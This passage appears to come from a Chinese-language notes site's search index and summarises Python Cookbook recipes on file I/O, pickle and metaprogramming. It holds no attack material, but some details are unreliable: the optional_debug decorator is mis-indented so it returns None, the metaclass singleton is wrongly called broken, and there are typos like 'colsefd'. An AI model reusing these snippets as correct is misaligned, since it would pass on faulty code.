f.detach()\n>>> b\n<_io.BufferedWriter name='sample.txt'>\n>>> f.write('hello')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nValueError: underlying buffer has been detached\n>>> 一旦断开最顶层后，你就可以给返回结果添加一个新的最顶层。比如: >>> f = io.TextIOWrapper(b, encoding='latin-1')\n>>> f\n<_io.TextIOWrapper name='sample.txt' encoding='latin-1'>\n>>> 尽管已经向你演示了改变编码的方法，但是你还可以利用这种技术来改变文件行 处理、错误机制以及文件处理的其他方面。例如: >>> sys.stdout = io.TextIOWrapper(sys.stdout.detach(), encoding='ascii', errors='xmlcharrefreplace')\n>>> print('Jalape\\u00f1o')\nJalape&#241;o\n>>> 注意下最后输出中的非 ASCII 字符 ñ 是如何被 &#241; 取代的。 将字节写入文本文件 在文本模式打开的文件中写入原始的字节数据 将字节数据直接写入文件的缓冲区即可: >>> import sys\n>>> sys.stdout.write(b'Hello\\n')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: must be str, not bytes\n>>> sys.stdout.buffer.write(b'Hello\\n')\nHello\n5\n>>> 类似的，能够通过读取文本文件的 buffer 属性来读取二进制数据 I/O 系统以层级结构的形式构建而成。\n文本文件是通过在一个拥有缓冲的二进制模 式文件上增加一个 Unicode 编码/解码层来创建。\nbuffer 属性指向对应的底层文件。如 果你直接访问它的话就会绕过文本编码/解码层。 本例展示的 sys.stdout 可能看起来有点特殊。\n默认情况下，sys.stdout 总 是以文本模式打开的。\n但是如果你在写一个需要打印二进制数据到标准输出的脚本的 话，你可以使用上面演示的技术来绕过文本编码层。 将文件描述符包装成文件对象 你有一个对应于操作系统上一个已打开的 I/O 通道 (比如文件、管道、套接字等) 的整型文件描述符，你想将它包装成一个更高层的 Python 文件对象。 一个文件描述符和一个打开的普通文件是不一样的。\n文件描述符仅仅是一个由操 作系统指定的整数，用来指代某个系统的 I/O 通道。\n如果你碰巧有这么一个文件描述 符，你可以通过使用 open() 函数来将其包装为一个 Python 的文件对象。\n你仅仅只需 要使用这个整数值的文件描述符作为第一个参数来代替文件名即可。\n如: # Open a low-level file descriptor\nimport os\nfd = os.open('somefile.txt', os.O_WRONLY | os.O_CREAT)\n# Turn into a proper file\nf = open(fd, 'wt') f.write('hello world\\n') f.close() 当高层的文件对象被关闭或者破坏的时候，底层的文件描述符也会被关闭。\n如果这 个并不是你想要的结果，你可以给 open() 函数传递一个可选的 colsefd=False 。比 如: # Create a file object, but don't close underlying fd when done\nf = open(fd, 'wt', closefd=False)\n... 在 Unix 系统中，这种包装文件描述符的技术可以很方便的将一个类文件接口作用 于一个以不同方式打开的 I/O 通道上，\n如管道、套接字等。举例来讲，下面是一个操 作管道的例子: from socket import socket, AF_INET, SOCK_STREAM\n\ndef echo_client(client_sock, addr):\n    print('Got connection from', addr)\n    # Make text-mode file wrappers for socket reading/writing\n    client_in = open(client_sock.fileno(), 'rt', encoding='latin-1',\n                closefd=False)\n    client_out = open(client_sock.fileno(), 'wt', encoding='latin-1',\n                closefd=False)\n\n    # Echo lines back to the client using file I/O\n    for line in client_in:\n        client_out.write(line)\n        client_out.flush()\n\n    client_sock.close()\n\ndef echo_server(address):\n    sock = socket(AF_INET, SOCK_STREAM)\n    sock.bind(address)\n    sock.listen(1)\n    while True:\n        client, addr = sock.accept()\n        echo_client(client, addr) 需要重点强调的一点是，上面的例子仅仅是为了演示内置的 open() 函数的一个特 性，并且也只适用于基于 Unix 的系统。\n如果你想将一个类文件接口作用在一个套接字 并希望你的代码可以跨平台，请使用套接字对象的 makefile() 方法。\n但是如果不考虑 可移植性的话，那上面的解决方案会比使用 makefile() 性能更好一点。 你也可以使用这种技术来构造一个别名，允许以不同于第一次打开文件的方式使 用它。\n例如，下面演示如何创建一个文件对象，它允许你输出二进制数据到标准输出 (通常以文本模式打开): import sys\n# Create a binary-mode file for stdout\nbstdout = open(sys.stdout.fileno(), 'wb', closefd=False)\nbstdout.write(b'Hello World\\n')\nbstdout.flush() 尽管可以将一个已存在的文件描述符包装成一个正常的文件对象，但是要注意的 是并不是所有的文件模式都被支持，\n并且某些类型的文件描述符可能会有副作用 (特别 是涉及到错误处理、文件结尾条件等等的时候)。\n在不同的操作系统上这种行为也是不 一样，特别的，上面的例子都不能在非 Unix 系统上运行。 创建临时文件和文件夹 你需要在程序执行时创建一个临时文件或目录，并希望使用完之后可以自动销毁 掉。 tempfile 模块( tempfile )中有很多的函数可以完成这任务。\n为了创建一个匿名的临时文件， 可以使用 tempfile.TemporaryFile from tempfile import TemporaryFile\nwith TemporaryFile('w+t') as f:\n    # Read/write to the file\n    f.write('Hello World\\n')\n    f.write('Testing\\n')\n    # Seek back to beginning and read the data\n    f.seek(0)\n    data = f.read()\n# Temporary file is destroyed 或者，如果你喜欢，你还可以像这样使用临时文件: f = TemporaryFile('w+t')\n# Use the temporary file\n...\nf.close()\n# File is destroyed TemporaryFile() 的第一个参数是文件模式，通常来讲文本模式使用 w+t ，二进 制模式使用 w+b 。\n这个模式同时支持读和写操作，在这里是很有用的，因为当你关闭 文件去改变模式的时候，文件实际上已经不存在了。\nTemporaryFile() 另外还支持跟内 置的 open() 函数一样的参数。比如: with TemporaryFile('w+t', encoding='utf-8', errors='ignore') as f:\n  ... 在大多数 Unix 系统上，通过 TemporaryFile() 创建的文件都是匿名的，甚至连目 录都没有。\n如果你想打破这个限制，可以使用 NamedTemporaryFile() 来代替。比如: from tempfile import NamedTemporaryFile\nwith NamedTemporaryFile('w+t') as f:\n  print('filename is:', f.name)\n  ...\n# File automatically destroyed 这里，被打开文件的 f.name 属性包含了该临时文件的文件名。\n当你需要将文件 名传递给其他代码来打开这个文件的时候，这个就很有用了。\n和 TemporaryFile() 一 样，结果文件关闭时会被自动删除掉。\n如果你不想这么做，可以传递一个关键字参数 delete=False 即可。 为了创建一个临时目录，可以使用 tempfile.TemporaryDirectory() 。比如: from tempfile import TemporaryDirectory\nwith TemporaryDirectory() as dirname:\n  print('dirname is:', dirname)\n  # Use the directory\n  ...\n# Directory and all contents destroyed TemporaryFile() 、NamedTemporaryFile() 和 TemporaryDirectory() 函数应该\n是处理临时文件目录的最简单的方式了，\n因为它们会自动处理所有的创建和清理步骤。\n在一个更低的级别，你可以使用 mkstemp() 和 mkdtemp() 来创建临时文件和目录。比 如: >>> import tempfile\n>>> tempfile.mkstemp()\n(3, '/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-/tmp7fefhv')\n>>> tempfile.mkdtemp()\n'/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-/tmp5wvcv6'\n>>> 但是，这些函数并不会做进一步的管理了。\n例如，函数 mkstemp() 仅仅就返回一 个原始的 OS 文件描述符，你需要自己将它转换为一个真正的文件对象。\n同样你还需要 自己清理这些文件。 通常来讲，临时文件在系统默认的位置被创建，比如 /var/tmp 或类似的地方。\n为 了获取真实的位置，可以使用 tempfile.gettempdir() 函数。比如: >>> tempfile.gettempdir()\n'/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-'\n>>> 所有和临时文件相关的函数都允许你通过使用关键字参数 prefix 、suffix 和 dir 来自定义目录以及命名规则。比如: >>> f = NamedTemporaryFile(prefix='mytemp', suffix='.txt', dir='/tmp')\n>>> f.name\n'/tmp/mytemp8ee899.txt'\n>>> 最后还有一点，尽可能以最安全的方式使用 tempfile 模块来创建临时文件。\n包括 仅给当前用户授权访问以及在文件创建过程中采取措施避免竞态条件。要注意的是不 同的平台可能会不一样。 与串行端口的数据通信 通过串行端口读写数据，典型场景就是和一些硬件设备打交道 (比如一个机器 人或传感器)。 尽管你可以通过使用 Python 内置的 I/O 模块来完成这个任务，但对于串行通信 最好的选择是使用 pySerial 包 。\n这个包的使用非常简单，先安装 pySerial，使用类似下 面这样的代码就能很容易的打开一个串行端口: import serial\nser = serial.Serial('/dev/tty.usbmodem641', # Device name varies\n                    baudrate=9600,\n                    bytesize=8,\n                    parity='N',\n                    stopbits=1) 设备名对于不同的设备和操作系统是不一样的。\n比如，在 Windows 系统上，你可 以使用 0, 1 等表示的一个设备来打开通信端口\"COM0\"和\"COM1\"。\n一旦端口打开， 那就可以使用 read()，readline() 和 write() 函数读写数据了。例如: ser.write(b'G1 X50 Y50\\r\\n')\nresp = ser.readline() 尽管表面上看起来很简单，其实串口通信有时候也是挺麻烦的。\n推荐你使用第三 方包如 pySerial 的一个原因是它提供了对高级特性的支持 (比如超时，控制流，缓冲 区刷新，握手协议等等)。\n举个例子，如果你想启用 RTS-CTS 握手协议，你只需要给 Serial() 传递一个 rtscts=True 的参数即可。 时刻记住所有涉及到串口的 I/O 都是二进制模式的。\n因此，确保你的代码使用的 是字节而不是文本 (或有时候执行文本的编码/解码操作)。\n另外当你需要创建二进制编 码的指令或数据包的时候，struct 模块也是非常有用的。 序列化 Python 对象 你需要将一个 Python 对象序列化为一个字节流，以便将它保存到一个文件、存储 到数据库或者通过网络传输它。 对于序列化最普遍的做法就是使用 pickle 模块。为了将一个对象保存到一个文件 中，可以这样做: import pickle\ndata = ... # Some Python object\nf = open('somefile', 'wb')\npickle.dump(data, f) 为了将一个对象转储为一个字符串，可以使用 pickle.dumps() s = pickle.dumps(data) 为了从字节流中恢复一个对象，使用 picle.load() 或 pickle.loads() 函数。比 如: # Restore from a file\nf = open('somefile', 'rb')\ndata = pickle.load(f)\n\n# Restore from a string\ndata = pickle.loads(s) 对于大多数应用程序来讲，dump() 和 load() 函数的使用就是你有效使用 pickle 模块所需的全部了。\n它可适用于绝大部分 Python 数据类型和用户自定义类的对象实 例。\n如果你碰到某个库可以让你在数据库中保存/恢复 Python 对象或者是通过网络传 输对象的话，那么很有可能这个库的底层就使用了 pickle 模块。 pickle 是一种 Python 特有的自描述的数据编码。\n通过自描述，被序列化后的数 据包含每个对象开始和结束以及它的类型信息。\n因此，你无需担心对象记录的定义，它 总是能工作。举个例子，如果要处理多个对象，你可以这样做: >>> import pickle\n>>> f = open('somedata', 'wb')\n>>> pickle.dump([1, 2, 3, 4], f)\n>>> pickle.dump('hello', f)\n>>> pickle.dump({'Apple', 'Pear', 'Banana'}, f)\n>>> f.close()\n\n>>> f = open('somedata', 'rb')\n>>> pickle.load(f)\n[1, 2, 3, 4]\n>>> pickle.load(f)\n'hello'\n>>> pickle.load(f)\n{'Apple', 'Pear', 'Banana'}\n>>> 你还能序列化函数，类，还有接口，但是结果数据仅仅将它们的名称编码成对应的 代码对象。: >>> import math\n>>> import pickle.\n>>> pickle.dumps(math.cos)\nb'\\x80\\x03cmath\\ncos\\nq\\x00.'\n>>> 当数据反序列化回来的时候，会先假定所有的源数据时可用的。模块、类和函数会 自动按需导入进来。\n对于 Python 数据被不同机器上的解析器所共享的应用程序而言， 数据的保存可能会有问题，因为所有的机器都必须访问同一个源代码。 注解 千万不要对不信任的数据使用 pickle.load()。\npickle 在加载时有一个副作用就是它会自动加载相应模块并构造实例对象。\n但是某个坏人如果知道 pickle 的工作原理， 他就可以创建一个恶意的数据导致 Python 执行随意指定的系统命令。\n因此，一定要保证 pickle 只在相互之间可以认证对方的解析器的内部使用。 有些类型的对象是不能被序列化的。\n这些通常是那些依赖外部系统状态的对象， 比如打开的文件，网络连接，线程，进程，栈帧等等。\n用户自定义类可以通过提供 __getstate__() 和 __setstate__() 方法来绕过这些限制。\n如果定义了这两个方法， pickle.dump() 就会调用 __getstate__() 获取序列化的对象。\n类似的， __setstate__() 在反序列化时被调用。\n为了演示这个工作原理，下面是一个在内部定义了一个线程但仍 然可以序列化和反序列化的类: # countdown.py\nimport time\nimport threading\n\nclass Countdown:\n  def __init__(self, n):\n      self.n = n\n      self.thr = threading.Thread(target=self.run)\n      self.thr.daemon = True\n      self.thr.start()\n\n  def run(self):\n      while self.n > 0:\n          print('T-minus', self.n)\n          self.n -= 1\n          time.sleep(5)\n\n  def __getstate__(self):\n      return self.n\n\n  def __setstate__(self, n):\n      self.__init__(n) 试着运行下面的序列化试验代码: >>> import countdown\n>>> c = countdown.Countdown(30)\n>>> T-minus 30\nT-minus 29\nT-minus 28\n...\n>>> # After a few moments\n>>> f = open('cstate.p', 'wb')\n>>> import pickle\n>>> pickle.dump(c, f)\n>>> f.close() 然后退出 Python 解析器并重启后再试验下: >>> f = open('cstate.p', 'rb')\n>>> pickle.load(f)\n<countdown.Countdown object at 0x10069e2d0>\nT-minus 19\nT-minus 18\n... 你可以看到线程又奇迹般的重生了，从你第一次序列化它的地方又恢复过来 pickle 对于大型的数据结构比如使用 array 或 numpy 模块创建的二进制数组效率 并不是一个高效的编码方式。\n如果你需要移动大量的数组数据，你最好是先在一个文 件中将其保存为数组数据块或使用更高级的标准编码方式如 HDF5 (需要第三方库的支 持)。 由于 pickle 是 Python 特有的并且附着在源码上，所有如果需要长期存储数据的 时候不应该选用它。\n例如，如果源码变动了，你所有的存储数据可能会被破坏并且变得 不可读取。\n坦白来讲，对于在数据库和存档文件中存储数据时，你最好使用更加标准的 数据编码格式如 XML，CSV 或 JSON。\n这些编码格式更标准，可以被不同的语言支持， 并且也能很好的适应源码变更。 最后一点要注意的是 pickle 有大量的配置选项和一些棘手的问题。\n对于最常见的 使用场景，你不需要去担心这个，但是如果你要在一个重要的程序中使用 pickle 去做 序列化的话，\n最好去查阅一下 官方文档 。","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-File,-IO.html","loc":"/yq-docs-rear-end-python-cookbook-File,-IO.html"},{"title":"元编程","text":"软件开发领域中最经典的口头禅就是\"don't repeat yourself\"。也就是说，任何时\n候当你的程序中存在高度重复 (或者是通过剪切复制) 的代码时，都应该想想是否有更\n好的解决方案。在 Python 当中，通常都可以通过元编程来解决这类问题。简而言之，\n元编程就是关于创建操作源代码 (比如修改、生成或包装原来的代码) 的函数和类。主\n要技术是使用装饰器、类装饰器和元类。不过还有一些其他技术，包括签名对象、使用\nexec() 执行代码以及对内部函数和类的反射技术等。本章的主要目的是向大家介绍这\n些元编程技术，并且给出实例来演示它们是怎样定制化你的源代码行为的。 在函数上添加包装器 你想在函数上添加一个包装器，增加额外的操作处理 (比如日志、计时等)。 使用装饰器函数 顺便说一下，内置的装饰器比如 @staticmethod, @classmethod,@property 原理\n也是一样的。例如，下面这两个代码片段是等价的: class A:\n\n  @classmethod\n  def method(cls):\n    pass\n\nclass B:\n  # Equivalent definition of a class method\n  def method(cls):\n    pass\n\n  method = classmethod(method) 创建装饰器时保留函数元信息 你写了一个装饰器作用在某个函数上，但是这个函数的重要的元信息比如名字、文\n档字符串、注解和参数签名都丢失了。 使用functools.wraps(fn) 保留元信息 @wraps 有一个重要特征是它能让你通过属性 __wrapped__ 直接访问被包装函数。 解除一个装饰器 一个装饰器已经作用在一个函数上，你想撤销它，直接访问原始的未包装的那个函数 假设装饰器是通过 @wraps (参考 9.2 小节) 来实现的，那么你可以通过访问\n__wrapped__ 属性来访问原始函数: >>> @somedecorator\n>>> def add(x, y):\n... return x + y\n...\n>>> orig_add = add.__wrapped__\n>>> orig_add(3, 4)\n7 直接访问未包装的原始函数在调试、内省和其他函数操作时是很有用的。但是我\n们这里的方案仅仅适用于在包装器中正确使用了 @wraps 或者直接设置了 __wrapped__\n属性的情况。 如果有多个包装器，那么访问 __wrapped__ 属性的行为是不可预知的，应该避免\n这样做 在 Python3.3 中后，它会略过所有的包装层. 最后要说的是，并不是所有的装饰器都使用了 @wraps ，因此这里的方案并不全部\n适用。特别的，内置的装饰器 @staticmethod 和 @classmethod 就没有遵循这个约定\n(它们把原始函数存储在属性 __func__ 中)。 定义一个带参数的装饰器 可自定义属性的装饰器 你想写一个装饰器来包装一个函数，并且允许用户提供参数在运行时控制装饰器\n行为。 引入一个访问函数，使用 nonlocal 来修改内部变量。然后这个访问函数被 作为一\n个属性赋值给包装函数 带可选参数的装饰器 主要注意带参数区别, 见 diff_warp_with_args 利用装饰器强制函数上的类型检查 作为某种编程规约，你想在对函数参数进行强制类型检查。 使用装饰器和 inspect.signature 函数 将装饰器定义为类的一部分 你想在类中定义装饰器，并将其作用在其他函数或方法上。 在类里面定义装饰器很简单，但是你首先要确认它的使用方式。比如到底是作为一\n个实例方法还是类方法 例: from functools import wraps\n\nclass A:\n\n  # Decorator as an instance method\n  def decorator1(self, func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n      print('Decorator 1')\n      return func(*args, **kwargs)\n    return wrapper\n\n  # Decorator as a class method\n  @classmethod\n  def decorator2(cls, func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n      print('Decorator 2')\n      return func(*args, **kwargs)\n    return wrapper 使用: # As an instance method\na = A()\n@a.decorator1\ndef spam():\n  pass\n\n# As a class method\n@A.decorator2\ndef grok():\n  pass 一个是实例调用，一个是类调用 在类中定义装饰器初看上去好像很奇怪，但是在标准库中有很多这样的例子。特别\n的，@property 装饰器实际上是一个类，它里面定义了三个方法 getter(), setter(),\ndeleter() , 每一个方法都是一个装饰器。 主要原因是各种不同的装饰器方法会在关联的 property 实\n例上操作它的状态。因此，任何时候只要你碰到需要在装饰器中记录或绑定信息，那么\n这不失为一种可行方法 对于类里面定义的包装器还有一点比较难理解，就是在涉及到继承的时候。例如，\n假设你想让在 A 中定义的装饰器作用在子类 B 中。你需要像下面这样写: class B(A):\n\n  @A.decorator2\n  def bar(self):\n    pass 也就是说，装饰器要被定义成类方法并且你必须显式的使用父类名去调用它。你不\n能使用 @B.decorator2 ，因为在方法定义时，这个类 B 还没有被创建。 将装饰器定义为类 你想使用一个装饰器去包装函数，但是希望返回一个可调用的实例。你需要让你的\n装饰器可以同时工作在类定义的内部和外部 需要实现 __call__() 和 __get__() 方法 , 如: import types\nfrom functools import wraps\n\nclass Profiled:\n  def __init__(self, func):\n    # 将自己设为装饰的对象\n    wraps(func)(self)\n    self.ncalls = 0\n\n  def __call__(self, *args, **kwargs):\n    self.ncalls += 1\n    return self.__wrapped__(*args, **kwargs)\n\n  # 描述器方法, 必须实现, 以补充所装饰类方法的第一个 self 参数\n  def __get__(self, instance, cls):\n    if instance is None:\n      return self\n    else:\n      return types.MethodType(self, instance) __get__() 方法是为了确保绑定方法对象能被正确的创建。type.MethodType() 手\n动创建一个绑定方法来使用。只有当实例被使用的时候绑定方法才会被创建。如果这个\n方法是在类上面来访问，那么 __get__() 中的 instance 参数会被设置成 None 并直接\n返回 Profiled 实例本身。 为类和静态方法提供装饰器 给类或静态方法提供装饰器是很简单的，不过要确保装饰器在 @classmethod 或\n@staticmethod 之后。不然被装饰的就是 @classmethod 了,\n而其又没有返回可调用对象. 装饰器为被包装函数增加参数 可以使用关键字参数来给被包装函数增加额外参数: from functools import wraps\ndef optional_debug(func):\n  @wraps(func)\n  def wrapper(*args, debug=False, **kwargs):\n    if debug:\n      print('Calling', func.__name__)\n      return func(*args, **kwargs)\n    return wrapper 调用: >>> @optional_debug\n... def spam(a,b,c):\n... print(a,b,c)\n...\n>>> spam(1,2,3)\n1 2 3\n>>> spam(1,2,3, debug=True)\nCalling spam\n1 2 3\n>>> 通过装饰器来给被包装函数增加参数的做法并不常见。尽管如此，有时候它可以避\n免一些重复代码。 这种实现方案之所以行得通，在于强制关键字参数很容易被添加到接受*args 和**kwargs 参数的函数中。 不过可能会与函数本来的参数冲突, 故可以在装饰器加入参数判断: if 'debug' in inspect.getargspec(func).args:\n  raise TypeError('debug argument already defined') 如果要支持使用inspect检查原有参数时, 显示这个关键字参数, 装饰器函数增加: @wraps(func)\ndef wrapper(*args, debug=False, **kwargs):\n  ...\n\nsig = inspect.signature(func)\nparms = list(sig.parameters.values())\nparms.append(inspect.Parameter('debug',\n    inspect.Parameter.KEYWORD_ONLY,\n    default=False))\nwrapper.__signature__ = sig.replace(parameters=parms)\n\nreturn wrapper 使用装饰器扩充类的功能 你想通过反省或者重写类定义的某部分来修改它的行为，但是你又不希望使用继\n承或元类的方式 这种情况可能是类装饰器最好的使用场景了。例如，下面是一个重写了特殊方法__getattribute__的类装饰器，可以打印日志: def log_getattribute(cls):\n  # Get the original implementation\n  orig_getattribute = cls.__getattribute__\n\n  # Make a new definition\n  def new_getattribute(self, name):\n    print('getting:', name)\n    return orig_getattribute(self, name)\n\n  # Attach to the class and return\n  cls.__getattribute__ = new_getattribute\n  return cls 如果你系想在一个类上面使用多个类装饰器，那么就需要注意下顺序问题。例如，\n一个装饰器 A 会将其装饰的方法完整替换成另一种实现，而另一个装饰器 B 只是简单\n的在其装饰的方法中添加点额外逻辑。那么这时候装饰器 A 就需要放在装饰器 B 的前\n面 使用元类控制实例的创建 不允许实例: class NoInstances(type):\n  def __call__(self, *args, **kwargs):\n    raise TypeError(\"Can't instantiate directly\")\n\n# Example\nclass Spam(metaclass=NoInstances):\n  @staticmethod\n  def grok(x):\n    print('Spam.grok') 实现单例模式: class Singleton(type):\n  def __init__(self, *args, **kwargs):\n    self.__instance = None\n    super().__init__(*args, **kwargs)\n\n  def __call__(self, *args, **kwargs):\n    if self.__instance is None:\n      self.__instance = super().__call__(*args, **kwargs)\n      return self.__instance\n    else:\n      return self.__instance 上述实现单例是错误的, 可能是古老的Python版本支持这样使用. 还是老老实实的: class Single(object):\n    __instance: 'Single' = None\n\n    def __new__(cls, *args, **kwargs):\n        if cls.__instance is None:\n            cls.__instance = super().__new__(cls)\n        return cls.__instance 捕获类的属性定义顺序 想自动记录一个类中属性和方法定义的顺序，然后可以利用它来做很多操作（比\n如序列化、映射到数据库等等）。 利用元类可以很容易的捕获类的定义信息。下面是一个例子，使用了一个 OrderedDict 来记录描述器的定义顺序 这里我没有看懂, 写的啥玩意儿, 跳过. 定义有可选参数的元类 你想定义一个元类，允许类定义时提供可选参数，这样可以控制或配置类型的创建\n过程。 在自定义元类中我们可以提供关键字参数: class Spam(metaclass=MyMeta, debug=True, synchronize=True):\n  pass 为了使元类支持这些关键字参数, 你必须确保在__prepare__(),__new__()和__init__()方法\n中都使用强制关键字参数。就像下面这样: class MyMeta(type):\n  # Optional\n  @classmethod\n  def __prepare__(cls, name, bases, *, debug=False, synchronize=False):\n    # Custom processing\n    pass\n    return super().__prepare__(name, bases)\n\n  # Required\n  def __new__(cls, name, bases, ns, *, debug=False, synchronize=False):\n    # Custom processing\n    pass\n    return super().__new__(cls, name, bases, ns)\n\n  # Required\n  def __init__(self, name, bases, ns, *, debug=False, synchronize=False):\n    # Custom processing\n    pass\n    super().__init__(name, bases, ns) 给一个元类添加可选关键字参数需要你完全弄懂类创建的所有步骤，因为这些参\n数会被传递给每一个相关的方法。__prepare__() 方法在所有类定义开始执行前首先\n被调用，用来创建类命名空间。通常来讲，这个方法只是简单的返回一个字典或其他映\n射对象。__new__() 方法被用来实例化最终的类对象。它在类的主体被执行完后开始执\n行。__init__() 方法最后被调用，用来执行其他的一些初始化工作。 当我们构造元类的时候，通常只需要定义一个 __new__() 或 __init__() 方法，但\n不是两个都定义。但是，如果需要接受其他的关键字参数的话，这两个方法就要同时提\n供，并且都要提供对应的参数签名。默认的 __prepare__() 方法接受任意的关键字参\n数，但是会忽略它们，所以只有当这些额外的参数可能会影响到类命名空间的创建时你\n才需要去定义 __prepare__() 方法。 通过使用强制关键字参数，在类的创建过程中我们必须通过关键字来指定这些参\n数。 使用关键字参数配置一个元类还可以视作对类变量的一种替代方式。例如: class Spam(metaclass=MyMeta):\n  debug = True\n  synchronize = True 将这些属性定义为参数的好处在于它们不会污染类的名称空间，这些属性仅仅只\n从属于类的创建阶段，而不是类中的语句执行阶段。另外，它们在 __prepare__() 方\n法中是可以被访问的，因为这个方法会在所有类主体执行前被执行。但是类变量只能在\n元类的 __new__() 和 __init__() 方法中可见。 *args和**kwargs的强制参数签名 你有一个函数或方法，它使用*args 和**kwargs 作为参数，这样使得它比较通用，\n但有时候你想检查传递进来的参数是不是某个你想要的类型。 对任何涉及到操作函数调用签名的问题，你都应该使用 inspect 模块中的签名特\n性。我们最主要关注两个类：Signature 和 Parameter 。下面是一个创建函数前面的交\n互例子: >>> from inspect import Signature, Parameter\n>>> # Make a signature for a func(x, y=42, *, z=None)\n>>> parms = [ Parameter('x', Parameter.POSITIONAL_OR_KEYWORD),\n...           Parameter('y', Parameter.POSITIONAL_OR_KEYWORD, default=42),\n...           Parameter('z', Parameter.KEYWORD_ONLY, default=None) ]\n>>> sig = Signature(parms)\n>>> print(sig)\n(x, y=42, *, z=None)\n>>> 一旦你有了一个签名对象，你就可以使用它的 bind() 方法很容易的将它绑定\n到*args 和**kwargs 上去: >>> def func(*args, **kwargs):\n...   bound_values = sig.bind(*args, **kwargs)\n...   for name, value in bound_values.arguments.items():\n...     print(name,value)\n...\n>>> # Try various examples\n>>> func(1, 2, z=3)\nx 1\ny 2\nz 3\n>>> func(1)\nx 1\n>>> func(1, z=3)\nx 1\nz 3\n>>> func(y=2, x=1)\nx 1 在我们需要构建通用函数库、编写装饰器或实现代理的时候，对于*args 和**kwargs\n的使用是很普遍的。但是，这样的函数有一个缺点就是当你想要实现自己的\n参数检验时，代码就会笨拙混乱。这时候我们可以\n通过一个签名对象来简化它。 使用类实现: from inspect import Signature, Parameter\ndef make_sig(*names):\n  parms = [Parameter(name, Parameter.POSITIONAL_OR_KEYWORD)\n            for name in names]\n  return Signature(parms)\n\nclass StructureMeta(type):\n  def __new__(cls, clsname, bases, clsdict):\n    clsdict['__signature__'] = make_sig(*clsdict.get('_fields',[]))\n    return super().__new__(cls, clsname, bases, clsdict)\n\nclass Structure(metaclass=StructureMeta):\n  _fields = []\n\n  def __init__(self, *args, **kwargs):\n    bound_values = self.__signature__.bind(*args, **kwargs)\n    for name, value in bound_values.arguments.items():\n      setattr(self, name, value)\n\n# Example\nclass Stock(Structure):\n  _fields = ['name', 'shares', 'price']\n\nclass Point(Structure):\n  _fields = ['x', 'y'] 当我们自定义签名的时候，将签名存储在特定的属性 __signature__ 中通常是很\n有用的。这样的话，在使用 inspect 模块执行内省的代码就能发现签名并将它作为调\n用约定: >>> import inspect\n>>> print(inspect.signature(Stock))\n(name, shares, price)\n>>> print(inspect.signature(Point))\n(x, y)\n>>> 在类上强制使用编程规约 你的程序包含一个很大的类继承体系，你希望强制执行某些编程规约（或者代码\n诊断）来帮助程序员保持清醒。 在元类中选择重新定义 __new__() 方法还是 __init__() 方法取决于你想怎样使\n用结果类。__new__() 方法在类创建之前被调用，通常用于通过某种方式（比如通过改\n变类字典的内容）修改类的定义。而 __init__() 方法是在类被创建之后被调用，当你\n需要完整构建类对象的时候会很有用。 其实就是使用顶级父类, 因为新旧版本不一致就不走书上的例子了 以编程方式定义类 问题 你在写一段代码，最终需要创建一个新的类对象。你考虑将类的定义源代码以字符\n串的形式发布出去。并且使用函数比如 exec() 来执行它，但是你想寻找一个更加优雅\n的解决方案。 解决方案 你可以使用函数 types.new_class() 来初始化新的类对象。你需要做的只是提供\n类的名字、父类元组、关键字参数，以及一个用成员变量填充类字典的回调函数。 如: # stock.py\n# Example of making a class manually from parts\n# Methods\n\ndef __init__(self, name, shares, price):\n  self.name = name\n  self.shares = shares\n  self.price = price\n\ndef cost(self):\n  return self.shares * self.price\n\ncls_dict = { '__init__' : __init__, 'cost' : cost,\n}\n\n# Make a class\nimport types\nStock = types.new_class('Stock', (), {}, lambda ns: ns.update(cls_dict))\nStock.__module__ = __name__ 这种方式会构建一个普通的类对象，并且按照你的期望工作: >>> s = Stock('ACME', 50, 91.1)\n>>> s\n<stock.Stock object at 0x1006a9b10>\n>>> s.cost()\n4555.0\n>>> Stock.__module__ = __name__ 用于生成 __repr__() 方法的输出。它同样也被用于很多库，比如 pickle\n。因此，为了让你创建的类是\"正确\"的，你需要确保这个属性也设置正确了。 如果你想创建的类需要一个不同的元类，可以通过 types.new_class() 第三个参\n数传递给它: Stock = types.new_class('Stock', (), {'metaclass': abc.ABCMeta}, lambda ns: ns.update(cls_dict)) 第三个参数还可以包含其他的关键字参数. 比如，一个类的定义如下: class Spam(Base, debug=True, typecheck=False):\n  pass 可以这样定义: Spam = types.new_class('Spam', (Base,),\n                      {'debug': True, 'typecheck': False},\n                      lambda ns: ns.update(cls_dict)) new_class() 第四个参数，用来接受类命名空间的映射对象的函\n数。通常这是一个普通的字典，但是它实际上是 __prepare__() 方法返回的任意对象， 讨论 很 多 时 候 如 果 能 构 造 新 的 类 对 象 是 很 有 用 的。有 个 很 熟 悉 的 例 子 是 调 用\ncollections.namedtuple() 函数 namedtuple() 使用 exec() 而不是上面介绍的技术 在定义的时候初始化类的成员 利用函数注解实现方法重载 问题 你已经学过怎样使用函数参数注解，那么你可能会想利用它来实现基于类型的方\n法重载。但是你不确定应该怎样去实现（或者到底行得通不）。 解决方案 基于一个简单的技术: Python 允许参数注解 如: class Spam:\n  def bar(self, x:int, y:int):\n    print('Bar 1:', x, y)\n\n  def bar(self, s:str, n:int = 0):\n    print('Bar 2:', s, n)\n\ns = Spam()\ns.bar(2, 3) # Prints Bar 1: 2 3\ns.bar('hello') # Prints Bar 2: hello 0 得使用inspect检查然后判断用哪个. 不表. 避免重复的属性方法 问题 你在类中需要重复的定义一些执行相同逻辑的属性方法，比如进行类型检查，怎样\n去简化这些重复代码呢 解决方案 使用自定义函数 如重复的属性访问器: class Person:\n  def __init__(self, name ,age):\n    self.name = name\n    self.age = age\n\n  @property\n  def name(self):\n    return self._name\n\n  @name.setter\n  def name(self, value):\n    if not isinstance(value, str):\n      raise TypeError('name must be a string')\n    self._name = value\n\n  @property\n  def age(self):\n    return self._age\n\n  @age.setter\n  def age(self, value):\n    if not isinstance(value, int):\n      raise TypeError('age must be an int')\n    self._age = value 可以使用函数简化: def typed_property(name, expected_type):\n  storage_name = '_' + name\n\n  @property\n  def prop(self):\n    return getattr(self, storage_name)\n\n  @prop.setter\n  def prop(self, value):\n    if not isinstance(value, expected_type):\n      raise 